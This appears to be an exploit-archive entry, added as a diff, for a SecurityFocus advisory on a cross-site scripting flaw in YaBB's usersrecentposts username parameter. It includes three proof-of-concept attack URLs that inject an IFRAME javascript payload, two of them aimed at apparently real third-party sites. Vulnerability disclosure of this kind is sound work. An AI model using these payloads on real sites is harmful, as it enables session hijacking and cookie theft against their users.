@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/12756/info
+
+A remote cross-site scripting vulnerability affects YaBB. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/YaBB.pl?action=usersrecentposts;username=<IFRAME%20SRC%3Djavascript:alert('PersianHacker.NET-XSS')><%252FIFRAME>
+http://wordforlife.com/cgi-bin/yabb2/YaBB.pl?action=usersrecentposts;username=<IFRAME%20SRC%3Djavascript:alert('PersianHacker.NET-XSS')><%252FIFRAME>
+http://yabbtest.spikecity.net/cgi-bin/SP2/YaBB.pl?action=usersrecentposts;username=<IFRAME%20SRC%3Djavascript:alert('PersianHacker.NET-XSS')><%252FIFRAME> 
